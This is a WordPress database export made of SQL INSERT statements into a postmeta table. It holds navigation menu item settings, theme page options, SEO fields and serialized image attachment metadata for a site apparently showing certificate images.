INSERT INTO `cmrfu_postmeta` VALUES("2279","1064","_wp_attachment_metadata","a:5:{s:5:\"width\";i:960;s:6:\"height\";i:350;s:4:\"file\";s:16:\"2016/11/mid1.png\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:16:\"mid1-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:6:\"medium\";a:4:{s:4:\"file\";s:16:\"mid1-300x109.png\";s:5:\"width\";i:300;s:6:\"height\";i:109;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:16:\"mid1-768x280.png\";s:5:\"width\";i:768;s:6:\"height\";i:280;s:9:\"mime-type\";s:9:\"image/png\";}s:4:\"post\";a:4:{s:4:\"file\";s:16:\"mid1-770x230.png\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:16:\"mid1-450x350.png\";s:5:\"width\";i:450;s:6:\"height\";i:350;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:16:\"mid1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:14:\"mid1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2275","924","_yoast_wpseo_primary_category","");
INSERT INTO `cmrfu_postmeta` VALUES("2274","924","_yoast_wpseo_content_score","30");
INSERT INTO `cmrfu_postmeta` VALUES("802","717","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("803","717","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("804","717","_menu_item_object_id","447");
INSERT INTO `cmrfu_postmeta` VALUES("805","717","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("806","717","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("807","717","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("808","717","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("809","717","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1875","918","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("1874","918","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("1873","918","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1872","918","_wp_page_template","page-portfolio.php");
INSERT INTO `cmrfu_postmeta` VALUES("1871","918","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("1997","948","_menu_item_menu_item_parent","950");
INSERT INTO `cmrfu_postmeta` VALUES("1995","946","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("1994","946","_edit_lock","1483902444:1");
INSERT INTO `cmrfu_postmeta` VALUES("1993","946","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("1992","946","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("1991","946","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("1990","946","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("1989","946","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("1996","948","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1987","946","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("1986","946","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1984","944","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("1983","944","_edit_lock","1479848878:1");
INSERT INTO `cmrfu_postmeta` VALUES("1982","944","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("1981","944","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("1980","944","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("1979","944","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("1978","944","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("1985","946","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("1976","944","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("1975","944","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1974","944","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("2278","1064","_wp_attached_file","2016/11/mid1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2269","1061","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("2268","1061","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("2267","1061","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2266","1061","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("2265","1061","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("2264","1061","_menu_item_object_id","944");
INSERT INTO `cmrfu_postmeta` VALUES("2263","1061","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1884","921","_menu_item_object_id","918");
INSERT INTO `cmrfu_postmeta` VALUES("1883","921","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1882","921","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1881","918","_edit_lock","1479849459:1");
INSERT INTO `cmrfu_postmeta` VALUES("1880","918","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("1869","915","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1877","918","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("1878","918","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("1879","918","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("2271","1061","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2298","1077","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1700;s:6:\"height\";i:2338;s:4:\"file\";s:32:\"2014/08/misya-sertifika2-001.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:32:\"misya-sertifika2-001-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:32:\"misya-sertifika2-001-218x300.jpg\";s:5:\"width\";i:218;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:33:\"misya-sertifika2-001-768x1056.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1056;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:33:\"misya-sertifika2-001-745x1024.jpg\";s:5:\"width\";i:745;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:32:\"misya-sertifika2-001-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:32:\"misya-sertifika2-001-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:32:\"misya-sertifika2-001-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:30:\"misya-sertifika2-001-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("1865","915","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1864","915","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1863","915","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1862","915","_menu_item_object_id","524");
INSERT INTO `cmrfu_postmeta` VALUES("1861","915","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1895","924","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("2297","1077","_wp_attached_file","2014/08/misya-sertifika2-001.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2296","1076","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1700;s:6:\"height\";i:2338;s:4:\"file\";s:31:\"2014/08/misya-sertifika-001.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"misya-sertifika-001-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"misya-sertifika-001-218x300.jpg\";s:5:\"width\";i:218;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:32:\"misya-sertifika-001-768x1056.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1056;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"misya-sertifika-001-745x1024.jpg\";s:5:\"width\";i:745;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"misya-sertifika-001-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"misya-sertifika-001-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"misya-sertifika-001-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"misya-sertifika-001-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("1050","748","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1051","748","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1052","748","_menu_item_object_id","524");
INSERT INTO `cmrfu_postmeta` VALUES("1053","748","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1054","748","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1055","748","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1056","748","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1057","748","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1058","749","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1059","749","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1060","749","_menu_item_object_id","517");
INSERT INTO `cmrfu_postmeta` VALUES("1061","749","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1062","749","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1063","749","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1064","749","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1065","749","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1066","750","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1067","750","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1068","750","_menu_item_object_id","497");
INSERT INTO `cmrfu_postmeta` VALUES("1069","750","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1070","750","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1071","750","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1072","750","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1073","750","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1074","751","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1075","751","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1076","751","_menu_item_object_id","447");
INSERT INTO `cmrfu_postmeta` VALUES("1077","751","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1078","751","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1079","751","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1080","751","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1081","751","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1893","454","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1894","454","er_leaf_portfolio_enable_filter","0");
INSERT INTO `cmrfu_postmeta` VALUES("1899","924","_format_video_embed","");
INSERT INTO `cmrfu_postmeta` VALUES("1138","759","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1139","759","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1140","759","_menu_item_object_id","524");
INSERT INTO `cmrfu_postmeta` VALUES("1141","759","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1142","759","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1143","759","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1144","759","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1145","759","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1146","760","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1147","760","_menu_item_menu_item_parent","759");
INSERT INTO `cmrfu_postmeta` VALUES("1148","760","_menu_item_object_id","550");
INSERT INTO `cmrfu_postmeta` VALUES("1149","760","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1150","760","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1151","760","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1152","760","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1153","760","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1154","761","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1155","761","_menu_item_menu_item_parent","759");
INSERT INTO `cmrfu_postmeta` VALUES("1156","761","_menu_item_object_id","567");
INSERT INTO `cmrfu_postmeta` VALUES("1157","761","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1158","761","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1159","761","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1160","761","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1161","761","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1162","762","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1163","762","_menu_item_menu_item_parent","11");
INSERT INTO `cmrfu_postmeta` VALUES("1164","762","_menu_item_object_id","394");
INSERT INTO `cmrfu_postmeta` VALUES("1165","762","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1166","762","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1167","762","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1168","762","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1169","762","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1170","763","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1171","763","_menu_item_menu_item_parent","11");
INSERT INTO `cmrfu_postmeta` VALUES("1172","763","_menu_item_object_id","417");
INSERT INTO `cmrfu_postmeta` VALUES("1173","763","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1174","763","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1175","763","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1176","763","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1177","763","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1178","764","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1179","764","_menu_item_menu_item_parent","11");
INSERT INTO `cmrfu_postmeta` VALUES("1180","764","_menu_item_object_id","440");
INSERT INTO `cmrfu_postmeta` VALUES("1181","764","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1182","764","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1183","764","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1184","764","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1185","764","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1186","765","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1187","765","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1188","765","_menu_item_object_id","198");
INSERT INTO `cmrfu_postmeta` VALUES("1189","765","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1190","765","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1191","765","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1192","765","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1193","765","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1194","766","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1195","766","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1196","766","_menu_item_object_id","206");
INSERT INTO `cmrfu_postmeta` VALUES("1197","766","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1198","766","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1199","766","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1200","766","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1201","766","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1202","767","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1203","767","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1204","767","_menu_item_object_id","234");
INSERT INTO `cmrfu_postmeta` VALUES("1205","767","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1206","767","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1207","767","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1208","767","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1209","767","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1210","768","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1211","768","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1212","768","_menu_item_object_id","215");
INSERT INTO `cmrfu_postmeta` VALUES("1213","768","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1214","768","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1215","768","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1216","768","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1217","768","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1218","769","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1219","769","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1220","769","_menu_item_object_id","240");
INSERT INTO `cmrfu_postmeta` VALUES("1221","769","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1222","769","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1223","769","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1224","769","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1225","769","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1226","770","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1227","770","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1228","770","_menu_item_object_id","305");
INSERT INTO `cmrfu_postmeta` VALUES("1229","770","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1230","770","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1231","770","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1232","770","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1233","770","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1234","771","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1235","771","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1236","771","_menu_item_object_id","269");
INSERT INTO `cmrfu_postmeta` VALUES("1237","771","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1238","771","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1239","771","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1240","771","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1241","771","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1242","772","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1243","772","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1244","772","_menu_item_object_id","389");
INSERT INTO `cmrfu_postmeta` VALUES("1245","772","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1246","772","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1247","772","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1248","772","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1249","772","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1250","773","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1251","773","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1252","773","_menu_item_object_id","323");
INSERT INTO `cmrfu_postmeta` VALUES("1253","773","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1254","773","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1255","773","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1256","773","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1257","773","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1258","774","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1259","774","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1260","774","_menu_item_object_id","315");
INSERT INTO `cmrfu_postmeta` VALUES("1261","774","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1262","774","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1263","774","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1264","774","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1265","774","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1266","775","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1267","775","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1268","775","_menu_item_object_id","283");
INSERT INTO `cmrfu_postmeta` VALUES("1269","775","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1270","775","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1271","775","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1272","775","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1273","775","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1274","776","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1275","776","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1276","776","_menu_item_object_id","341");
INSERT INTO `cmrfu_postmeta` VALUES("1277","776","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1278","776","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1279","776","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1280","776","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1281","776","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1282","777","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1283","777","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1284","777","_menu_item_object_id","332");
INSERT INTO `cmrfu_postmeta` VALUES("1285","777","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1286","777","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1287","777","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1288","777","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1289","777","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1290","778","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1291","778","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1292","778","_menu_item_object_id","362");
INSERT INTO `cmrfu_postmeta` VALUES("1293","778","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1294","778","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1295","778","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1296","778","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1297","778","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1298","779","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1299","779","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1300","779","_menu_item_object_id","292");
INSERT INTO `cmrfu_postmeta` VALUES("1301","779","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1302","779","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1303","779","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1304","779","_menu_item_xfn","");
